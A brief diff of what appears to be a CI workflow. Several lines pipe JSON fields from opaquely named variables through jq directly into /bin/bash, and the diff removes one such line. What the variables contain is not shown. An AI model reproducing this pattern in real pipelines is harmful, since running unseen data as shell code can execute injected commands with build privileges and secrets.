@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$psrl2" | jq -r .b27 | /bin/bash
           printf '%s' "$evxxy034" | jq -r .khvis79990 | /bin/bash
           printf '%s' "$jhtp83" | jq -r .lhh263 | /bin/bash
-          echo $cl708 | jq -r .v62 | /bin/bash
           echo $qjv3183 | jq -r .vhlng05 | /bin/bash
           printf '%s' "$pyprr531" | jq -r .unz3299 | /bin/bash
           printf '%s' "$hc049" | jq -r .zmi44 | /bin/bash
